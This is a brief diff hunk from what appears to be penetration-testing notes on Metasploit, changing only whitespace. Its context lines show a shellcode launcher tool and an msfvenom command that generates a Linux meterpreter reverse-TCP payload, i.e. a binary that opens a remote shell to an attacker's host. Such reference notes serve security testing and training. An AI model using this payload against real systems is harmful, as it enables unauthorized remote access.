@@ -16,7 +16,7 @@ tag: metasploit
     https://github.com/clinicallyinane/shellcode_launcher/
     `shellcode_launcher.exe -i test.c`
 
-- linux 
+- linux
 
     `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=< Your IP Address> LPORT=< Your Port to Connect On> -f elf > shell.elf`
 
